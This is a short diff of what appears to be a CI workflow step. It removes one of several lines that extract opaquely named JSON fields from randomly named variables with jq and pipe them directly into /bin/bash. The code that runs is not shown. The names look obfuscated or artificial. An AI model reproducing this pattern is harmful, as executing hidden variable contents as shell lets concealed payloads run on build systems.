@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$cpsp2" | jq -r .ny4 | /bin/bash
           echo $gjj40840 | jq -r .zyj4 | /bin/bash
-          printf '%s' "$m4" | jq -r .e28 | /bin/bash
           echo $lprhc90384 | jq -r .fyc3642 | /bin/bash
           echo $cu91 | jq -r .qlqqa42 | /bin/bash
           printf '%s' "$qgut8595" | jq -r .mhay41079 | /bin/bash
